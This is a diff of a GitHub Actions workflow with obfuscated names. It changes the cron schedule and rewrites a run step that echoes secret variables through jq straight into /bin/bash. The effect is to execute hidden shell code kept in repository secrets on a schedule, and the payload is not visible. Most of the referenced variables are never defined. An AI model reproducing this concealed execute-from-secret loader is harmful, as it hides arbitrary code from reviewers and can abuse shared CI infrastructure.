@@ -3,30 +3,27 @@ name: donglaopo7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 4/6 * * *'
+    - cron: '0 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: donglaopo7654
         env:
-          xat662: ${{ secrets.xat662 }}
+          ikfu3814: ${{ secrets.ikfu3814 }}
         run: |
-          echo $xat662 | jq -r .qgz372 | /bin/bash
-          echo $cd76709 | jq -r .nklra144 | /bin/bash
-          echo $ksx664 | jq -r .oxuqm9333 | /bin/bash
-          echo $jc26 | jq -r .hjz6933 | /bin/bash
-          echo $wjt10 | jq -r .rb197 | /bin/bash
-          echo $iaewq730 | jq -r .phyw56 | /bin/bash
-          echo $eq9416 | jq -r .okes2194 | /bin/bash
-          echo $xlt4667 | jq -r .aoejl6481 | /bin/bash
-          echo $u545 | jq -r .tqjka87 | /bin/bash
-          echo $vz15 | jq -r .gj38620 | /bin/bash
-          echo $edfx32 | jq -r .qh206 | /bin/bash
-          echo $xndit3 | jq -r .iiq1369 | /bin/bash
-          echo $ptsu23440 | jq -r .wwi4027 | /bin/bash
-          echo $pm61159 | jq -r .qe2 | /bin/bash
-          echo $tsa2110 | jq -r .nrn7 | /bin/bash
+          echo $ikfu3814 | jq -r .jtj4 | /bin/bash
+          echo $uyg0375 | jq -r .fd78628 | /bin/bash
+          echo $lcfum5609 | jq -r .j00 | /bin/bash
+          echo $tpgr06743 | jq -r .p70 | /bin/bash
+          echo $mrloq96242 | jq -r .pvft4 | /bin/bash
+          echo $zv40 | jq -r .pkx69966 | /bin/bash
+          echo $cp3 | jq -r .au6 | /bin/bash
+          echo $gkp7 | jq -r .le17 | /bin/bash
+          echo $aoyhy350 | jq -r .jjsws40148 | /bin/bash
+          echo $sfb1141 | jq -r .tcznj5487 | /bin/bash
+          echo $wjby8461 | jq -r .rze43683 | /bin/bash
+          echo $bzke75063 | jq -r .v5 | /bin/bash
+          echo $edcow2 | jq -r .cx6018 | /bin/bash
 
